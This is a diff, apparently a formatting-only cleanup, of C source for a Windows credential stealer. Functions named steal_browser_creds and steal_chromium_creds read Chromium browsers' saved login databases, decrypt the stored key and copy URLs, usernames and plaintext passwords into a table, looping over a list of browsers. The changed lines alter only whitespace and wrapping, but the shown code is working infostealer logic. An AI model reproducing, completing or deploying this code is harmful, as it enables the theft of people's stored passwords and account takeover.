@@ -194,7 +194,8 @@ static int decrypt_key(BYTE encryptedKey[], size_t encryptedKeySize,
 }
 
 // Steals credentials for a singular `browser`
-static int steal_browser_creds(BrowserInfo browser, Credential * credTab, DWORD32 * indexCredTab) {
+static int steal_browser_creds(BrowserInfo browser, Credential *credTab,
+                               DWORD32 *indexCredTab) {
   // login data contains each logins with the password encrypted and other
   // attributes in clear text
 
@@ -253,7 +254,7 @@ static int steal_browser_creds(BrowserInfo browser, Credential * credTab, DWORD3
   if (decode_key(encodedKey, &encryptedKey, &encryptedKeySize) !=
       EXIT_SUCCESS) {
 #ifdef DEBUG
-        printf("Could not decode %ls\n", encodedKey);
+    printf("Could not decode %ls\n", encodedKey);
 #endif
     return EXIT_FAILURE;
   }
@@ -277,7 +278,7 @@ static int steal_browser_creds(BrowserInfo browser, Credential * credTab, DWORD3
   }
 
   for (int i = 0; i < credentialsCount; i++) {
-    if (*indexCredTab < CRED_SIZE){
+    if (*indexCredTab < CRED_SIZE) {
       credTab[*indexCredTab].url = strdup(credentials[i].url);
       credTab[*indexCredTab].username = strdup(credentials[i].username);
       credTab[*indexCredTab].password = strdup(credentials[i].password);
@@ -296,7 +297,7 @@ static int steal_browser_creds(BrowserInfo browser, Credential * credTab, DWORD3
   return EXIT_SUCCESS;
 }
 
-int steal_chromium_creds(Credential * credTab, DWORD32 * indexCredTab) {
+int steal_chromium_creds(Credential *credTab, DWORD32 *indexCredTab) {
   /* BrowserInfo browsers[] = {
       {L"7Star", L"\\7Star\\7Star\\User Data\\Default\\Login Data",
        L"\\7Star\\7Star\\User Data\\Local State"},
@@ -498,7 +499,8 @@ int steal_chromium_creds(Credential * credTab, DWORD32 * indexCredTab) {
   };
 
   for (int i = 0; i < sizeof(browsers) / sizeof(BrowserInfo); i++) {
-    if (steal_browser_creds(browsers[i], credTab, indexCredTab) != EXIT_SUCCESS) {
+    if (steal_browser_creds(browsers[i], credTab, indexCredTab) !=
+        EXIT_SUCCESS) {
 #ifdef DEBUG
       fwprintf(stderr, L"Unable to find credentials for %s. Continuing...\n",
                browsers[i].browserName);
